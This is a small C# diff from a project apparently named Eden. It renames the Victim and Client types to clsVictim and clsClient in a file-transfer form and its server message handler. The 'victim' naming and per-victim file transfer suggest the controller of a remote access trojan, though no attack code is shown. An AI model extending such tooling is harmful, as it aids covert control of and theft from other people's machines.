@@ -13,8 +13,8 @@ namespace Eden
 {
     public partial class frmFileTransfer : Form
     {
-        private Victim m_victim;
-        private Client m_clnt;
+        private clsVictim m_victim;
+        private clsClient m_clnt;
         public string m_szVictimID;
 
         private string m_szCurrentDir { get; set; }
@@ -32,7 +32,7 @@ namespace Eden
 
         private object m_objLock = new object();
 
-        public frmFileTransfer(Victim victim, string szCurrentDir, List<string> lszFilePath, TransferFileType transferType)
+        public frmFileTransfer(clsVictim victim, string szCurrentDir, List<string> lszFilePath, TransferFileType transferType)
         {
             InitializeComponent();
 
@@ -45,7 +45,7 @@ namespace Eden
             m_transferType = transferType;
         }
 
-        void fnSrvRecv(Client clnt, string szVictimID, string[] aszMsg)
+        void fnSrvRecv(clsClient clnt, string szVictimID, string[] aszMsg)
         {
             if (szVictimID != m_victim.m_szID)
                 return;
